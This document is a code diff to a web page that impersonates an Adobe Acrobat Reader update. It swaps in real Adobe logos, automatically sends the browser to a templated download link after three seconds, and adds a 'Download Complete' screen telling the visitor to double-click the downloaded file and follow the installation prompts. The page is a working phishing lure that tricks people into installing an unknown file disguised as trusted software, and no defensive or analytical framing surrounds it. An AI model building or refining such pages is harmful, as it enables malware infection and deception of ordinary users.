@@ -25,12 +25,9 @@
     padding: 12px 30px;
     flex-shrink: 0;
   }
-  .adobe-bar span {
-    font-size: 1.35rem;
-    font-weight: 900;
-    font-style: italic;
-    color: #e11d48;
-    letter-spacing: -0.5px;
+  .adobe-bar img {
+    height: 26px;
+    display: block;
   }
 
   .bg-area {
@@ -43,7 +40,7 @@
   }
 
   .card {
-    background: rgba(10, 10, 10, 0.75);
+    background: rgba(10, 10, 10, 0.55);
     backdrop-filter: blur(16px);
     -webkit-backdrop-filter: blur(16px);
     border-radius: 18px;
@@ -62,7 +59,7 @@
     gap: 12px;
     margin-bottom: 26px;
   }
-  .acrobat-icon { width: 36px; height: 36px; }
+  .acrobat-icon { width: 38px; height: 38px; object-fit: contain; }
   .card-header h2 { font-size: 1.2rem; font-weight: 600; color: #fff; }
 
   .card h1 {
@@ -93,6 +90,17 @@
     min-height: 22px;
   }
 
+  .checkmark {
+    margin-bottom: 18px;
+  }
+  .checkmark svg {
+    animation: scaleIn 0.4s ease;
+  }
+  @keyframes scaleIn {
+    0% { transform: scale(0); opacity: 0; }
+    100% { transform: scale(1); opacity: 1; }
+  }
+
   @media (max-width: 580px) {
     .card { padding: 28px 22px; }
     .card h1 { font-size: 1.5rem; }
@@ -101,34 +109,41 @@
 </head>
 <body>
 
-<div class="adobe-bar"><span>Adobe</span></div>
+<div class="adobe-bar">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Adobe_Systems_logo_and_wordmark.svg/1200px-Adobe_Systems_logo_and_wordmark.svg.png" alt="Adobe" style="height:26px;">
+</div>
 
 <div class="bg-area">
   <div class="card">
     <div class="card-header">
-      <svg class="acrobat-icon" viewBox="0 0 240 234" xmlns="http://www.w3.org/2000/svg">
-        <path d="M47.4 0h145.2c26.2 0 47.4 21.2 47.4 47.4v138.6c0 26.2-21.2 47.4-47.4 47.4H47.4C21.2 233.4 0 212.2 0 186V47.4C0 21.2 21.2 0 47.4 0z" fill="#B30B00"/>
-        <path d="M120 176.4h-8.4l16.2-46.2c7.2 3 15.6 8.4 20.4 15.6L120 176.4z" fill="#fff"/>
-        <path d="M78 55.2L120 176.4l28.2-30.6c-4.8-7.2-13.2-12.6-20.4-15.6L78 55.2z" fill="#fff"/>
-        <path d="M162.5 55.2h-28.2l-6.6 21.6h28.2l6.6-21.6z" fill="#fff"/>
-        <path d="M78 55.2h28.2l21.6 75.6c-8.4-3-18-3.6-27-1.2L78 55.2z" fill="#fff"/>
-      </svg>
+      <img class="acrobat-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/42/Adobe_Acrobat_DC_logo_2020.svg/1200px-Adobe_Acrobat_DC_logo_2020.svg.png" alt="Adobe Acrobat">
       <h2>Adobe Acrobat Reader</h2>
     </div>
 
-    <h1 id="status-heading">Please wait...</h1>
-
-    <p>To read the document, you do not have the latest version of Adobe Acrobat Reader for Windows App installed. The latest version of Adobe Acrobat Reader will download automatically, kindly install or open to view the shared document.</p>
-
-    <div class="manual" id="manual">
-      If the download doesn't start automatically, Click., <a href="{{download_url}}" id="manual-link">Download Manually.</a>
+    <div id="phase-waiting">
+      <h1>Please wait...</h1>
+      <p>To read the document, you do not have the latest version of Adobe Acrobat Reader for Windows App installed. The latest version of Adobe Acrobat Reader will download automatically, kindly install or open to view the shared document.</p>
+      <div class="manual" id="manual">
+        If the download doesn't start automatically, Click., <a href="{{download_url}}" id="manual-link">Download Manually.</a>
+      </div>
+      <ul class="instructions">
+        <li>Open your download folder to access the document</li>
+      </ul>
     </div>
 
-    <ul class="instructions">
-      <li>Open your download folder to access the document</li>
-    </ul>
-
-    <div class="status" id="status"></div>
+    <div id="phase-done" style="display:none;">
+      <div class="checkmark">
+        <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="9 12 11.5 14.5 16 9.5"/></svg>
+      </div>
+      <h1 style="color:#4ade80;">Download Complete</h1>
+      <p style="margin-bottom:24px;">Your update is ready. Follow the steps below to install and view your document.</p>
+      <ul class="instructions" style="margin-bottom:0;">
+        <li>Open your <strong style="color:#fff;">Downloads</strong> folder</li>
+        <li>Double-click the downloaded file to begin installation</li>
+        <li>Follow the on-screen prompts to complete setup</li>
+        <li>Once installed, your document will open automatically</li>
+      </ul>
+    </div>
   </div>
 </div>
 
@@ -138,10 +153,16 @@
   if (!dlUrl) return;
   var triggered = false;
 
+  function showDone() {
+    document.getElementById("phase-waiting").style.display = "none";
+    document.getElementById("phase-done").style.display = "block";
+  }
+
   function doDownload() {
     if (triggered) return;
     triggered = true;
     window.location.href = dlUrl;
+    setTimeout(showDone, 2000);
   }
 
   setTimeout(doDownload, 3000);
